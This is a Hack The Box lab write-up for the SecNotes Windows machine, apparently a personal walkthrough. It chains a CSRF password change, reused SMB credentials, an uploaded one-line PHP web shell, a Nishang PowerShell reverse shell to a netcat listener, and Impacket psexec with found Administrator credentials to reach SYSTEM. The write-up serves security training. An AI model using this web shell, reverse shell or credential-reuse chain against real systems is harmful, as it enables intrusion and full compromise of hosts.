# SecNotes

**SecNotes** is a Windows-based Hack The Box machine focused on web application enumeration, authentication weaknesses, CSRF, SMB access, remote code execution, Windows Subsystem for Linux (WSL) enumeration, credential discovery, and privilege escalation to `NT AUTHORITY\SYSTEM`.

**Target IP:** `10.129.80.175`

---

## Overview

| Information            | Details                                  |
| ---------------------- | ---------------------------------------- |
| Machine                | SecNotes                                 |
| Platform               | Windows                                  |
| Target IP              | `10.129.80.175`                          |
| Web Server             | Microsoft IIS 10.0                       |
| SMB                    | Port 445                                 |
| Additional Web Service | Port 8808                                |
| Initial Access         | Web application / SMB                    |
| User                   | `tyler`                                  |
| Privilege Escalation   | Administrator credentials → SMB / PsExec |
| Final Privilege        | `NT AUTHORITY\SYSTEM`                    |

### Attack Path

```text
Nmap Enumeration
        ↓
Web Application on Port 80
        ↓
Register / Login
        ↓
CSRF on Change Password Functionality
        ↓
Access as Tyler
        ↓
Discover SMB Credentials
        ↓
Authenticated SMB Access
        ↓
Writable new-site Share
        ↓
Upload PHP Web Shell
        ↓
PowerShell Reverse Shell
        ↓
WSL Enumeration
        ↓
Discover Administrator Credentials
        ↓
Impacket PsExec
        ↓
NT AUTHORITY\SYSTEM
        ↓
User + Root Flags
```

---

# 1. Enumeration

## Full Port Scan

We begin with a full TCP port scan against the target.

```bash
nmap -p- 10.129.80.175
```

The scan reveals three open ports:

```text
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast
```

The presence of both HTTP and SMB immediately gives us multiple services to investigate.

---

## Service and Version Detection

Next, we perform service and version detection.

```bash
nmap -sC -sV -p80,445,8808 10.129.80.175
```

Important results:

```text
80/tcp   open  http         Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134
8808/tcp open  http         Microsoft IIS httpd 10.0
```

The HTTP service on port `80` identifies itself as:

```text
Microsoft-IIS/10.0
```

and the title is:

```text
Secure Notes - Login
```

The SMB enumeration also provides useful host information:

```text
Computer name: SECNOTES
NetBIOS computer name: SECNOTES
Workgroup: HTB
```

The scan also shows that SMB message signing is not required, although the attack path used later does not depend on exploiting that configuration.

---

# 2. Web Enumeration

We begin investigating the main web application on port `80`.

For easier access, we add the hostname to `/etc/hosts`:

```text
10.129.80.175    secnotes.htb
```

The application presents a login page for **Secure Notes**.

We register an account and authenticate to the application.

During enumeration, we also discover functionality related to changing passwords.

The application contains a page similar to:

```text
http://secnotes.htb/change_pass.php
```

---

# 3. Initial Access

## CSRF Vulnerability

While testing the password-change functionality, we identify an issue with the way the application processes password-change requests.

The endpoint accepts both `GET` and `POST` requests, and the functionality is affected by a CSRF issue.

A password-change request can be constructed using parameters such as:

```text
http://secnotes.htb/change_pass.php?password=newpassword&confirm_password=newpassword&submit=submit
```

The request can then be sent to the contact associated with the `tyler` account.

This allows the password for the targeted account to be changed.

As a result, we can authenticate to the application as **Tyler**.

---

# 4. Discovering SMB Credentials

After gaining access as Tyler, further enumeration of the application reveals SMB-related credentials.

The discovered information is:

```text
Username: tyler
Password: 92g!mA8BGjOirkL%OG*&
Share: \\secnotes.htb\new-site
```

We can now authenticate to the SMB service.

---

# 5. SMB Enumeration

We use `smbmap` to enumerate the available shares.

```bash
smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.129.80.175
```

The target accepts the credentials:

```text
[+] IP: 10.129.80.175:445
    Name: secnotes.htb
    Status: Authenticated
```

The available shares are:

```text
Disk        Permissions
----        -----------
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
new-site    READ, WRITE
```

The important finding is:

```text
new-site    READ, WRITE
```

We have both read and write access to the `new-site` share.

---

## Connecting to the Share

We connect using `smbclient`:

```bash
smbclient //10.129.80.175/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
```

The connection succeeds:

```text
Try "help" to get a list of possible commands.
smb: \>
```

We enumerate the contents:

```bash
ls
```

The share contains:

```text
iisstart.htm
iisstart.png
rev.php
```

Because the share is writable and corresponds to a web directory, we investigate whether uploaded files can be accessed through the web server.

---

# 6. Web Shell

We upload a PHP file that executes commands supplied through a GET parameter.

The PHP code used is:

```php
<?php echo shell_exec($_GET["c"]); ?>
```

The file is named:

```text
re.php
```

We then access it through the second IIS web service:

```text
http://secnotes.htb:8808/re.php?c=whoami
```

This confirms command execution through the uploaded PHP file.

---

# 7. PowerShell Reverse Shell

To obtain a more useful interactive shell, we use a PowerShell reverse-shell script from Nishang.

We copy the PowerShell reverse-shell script:

```bash
cp Invoke-PowerShellTcp.ps1 /home/naval0505/rev.ps1
```

We then modify the script as required and upload it to the writable SMB share.

```bash
smbclient //10.129.80.175/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
```

Inside the SMB session:

```text
put rev.ps1
```

The file is successfully uploaded.

We start a listener:

```bash
rlwrap nc -lvnp 4444
```

A connection is received:

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.80.175 53737

Windows PowerShell running as user SECNOTES$ on SECNOTES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\new-site>
```

We now have a PowerShell shell on the target.

---

# 8. Windows Enumeration

We begin basic filesystem enumeration.

```powershell
ls
```

At the root of the `C:\` drive, an interesting file stands out:

```text
Ubuntu.zip
```

The directory listing includes:

```text
Distros
inetpub
Microsoft
PerfLogs
php7
Program Files
Program Files (x86)
Users
Windows
Ubuntu.zip
```

The presence of `Ubuntu.zip` suggests that WSL may be installed or configured on the system.

---

# 9. WSL Enumeration

We check the Windows registry for WSL distributions.

```powershell
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss |
%{Get-ItemProperty $_.PSPath} | out-string -width 4096
```

The output confirms an Ubuntu WSL installation:

```text
State             : 1
DistributionName  : Ubuntu-18.04
Version           : 1
BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState
PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc
```

This confirms that **Ubuntu 18.04 under WSL** is installed on the target.

---

# 10. Credential Discovery

Further enumeration of the WSL environment and SMB-related files leads to additional information.

The notes show attempts to access the local Windows `C$` share from the WSL environment:

```bash
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
```

Additional tooling is installed and tested:

```bash
sudo apt install cifs-utils
```

Further enumeration includes:

```bash
cat /proc/filesystems
```

and:

```bash
sudo modprobe cifs
```

During this investigation, an Administrator credential is discovered:

```text
administrator
u6!4ZwgwOM#^OBf#Nwnh
```

This provides a direct route to authenticated administrative access over SMB.

---

# 11. Administrator Access

With the discovered Administrator credentials, we use Impacket's `psexec.py`.

```bash
psexec.py secnotes/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@secnotes.htb
```

Impacket successfully authenticates to the target.

The output shows:

```text
[*] Requesting shares on secnotes.htb.....
[*] Found writable share ADMIN$
[*] Uploading file dSJqbaMx.exe
[*] Opening SVCManager on secnotes.htb.....
[*] Creating service ayGG on secnotes.htb.....
[*] Starting service ayGG.....
```

A Windows command shell is then opened:

```text
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

We verify the current user:

```cmd
whoami
```

Output:

```text
nt authority\system
```

We now have **SYSTEM-level privileges**.

---

# 12. User Flag

We navigate to Tyler's desktop:

```powershell
cd C:\Users\tyler\Desktop
```

Listing the directory shows:

```text
bash.lnk
Command Prompt.lnk
File Explorer.lnk
Microsoft Edge.lnk
Notepad++.lnk
user.txt
Windows PowerShell.lnk
```

The user flag is located at:

```text
C:\Users\tyler\Desktop\user.txt
```

We retrieve it with:

```powershell
type user.txt
```

---

# 13. Root Flag

Since we have already obtained:

```text
NT AUTHORITY\SYSTEM
```

we can access the Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
```

The directory contains:

```text
Microsoft Edge.lnk
root.txt
```

The root flag is located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

It can be retrieved with:

```powershell
type root.txt
```

---

# Attack Path Summary

```text
10.129.80.175
       │
       ▼
Full Port Scan
       │
       ├── 80/tcp  → IIS 10.0
       ├── 445/tcp → SMB
       └── 8808/tcp → IIS 10.0
                    │
                    ▼
             Secure Notes
                    │
                    ▼
          Password Change Function
                    │
                    ▼
             CSRF Vulnerability
                    │
                    ▼
              Access as Tyler
                    │
                    ▼
          Discover SMB Credentials
                    │
                    ▼
          SMB: new-site READ/WRITE
                    │
                    ▼
             Upload PHP Shell
                    │
                    ▼
          Command Execution on 8808
                    │
                    ▼
         PowerShell Reverse Shell
                    │
                    ▼
             Windows Enumeration
                    │
                    ▼
               WSL Detected
                    │
                    ▼
          Credential Discovery
                    │
                    ▼
       Administrator Credentials
                    │
                    ▼
             Impacket PsExec
                    │
                    ▼
          NT AUTHORITY\SYSTEM
                    │
             ┌──────┴──────┐
             ▼             ▼
          user.txt       root.txt
```

---

# Key Takeaways

* Full port scanning is important because the machine exposed multiple services on non-standard ports.
* Web applications should be tested for authentication and request-handling weaknesses.
* Password-management functionality can introduce serious security risks when CSRF protections are missing.
* SMB shares should always be enumerated after obtaining valid credentials.
* Writable shares mapped to web directories can potentially lead to server-side code execution.
* Windows environments should be checked for additional components such as WSL.
* Configuration files, shell histories, and local environments can contain sensitive credentials.
* Discovered administrative credentials can provide a direct path to system-level access.
* Always verify the final privilege level using `whoami`.

---

# Tools Used

| Tool       | Purpose                              |
| ---------- | ------------------------------------ |
| Nmap       | Port and service enumeration         |
| Burp Suite | Web application assessment           |
| smbmap     | SMB share enumeration                |
| smbclient  | SMB authentication and file transfer |
| Netcat     | Reverse shell listener               |
| rlwrap     | Improved shell interaction           |
| Nishang    | PowerShell reverse-shell script      |
| Impacket   | SMB-based administrative execution   |
| PowerShell | Windows enumeration                  |
| WSL        | Local Linux environment enumeration  |

---

# Conclusion

SecNotes demonstrates how several individually important security issues can be chained together to compromise a Windows system.

The assessment began with network enumeration, revealing IIS, SMB, and an additional IIS service. Investigation of the Secure Notes application uncovered a CSRF issue in the password-change functionality, which provided access to the Tyler account.

The discovered credentials could then be reused against SMB, where a writable `new-site` share provided an opportunity to place a PHP file into a web-accessible location. This resulted in command execution and eventually a PowerShell reverse shell.

Further Windows enumeration revealed an installed WSL environment. Continued investigation uncovered Administrator credentials, which were then used with Impacket to obtain a SYSTEM-level shell.

The machine highlights the importance of **secure web application design, proper CSRF protection, credential reuse prevention, SMB access controls, and careful post-exploitation enumeration**.
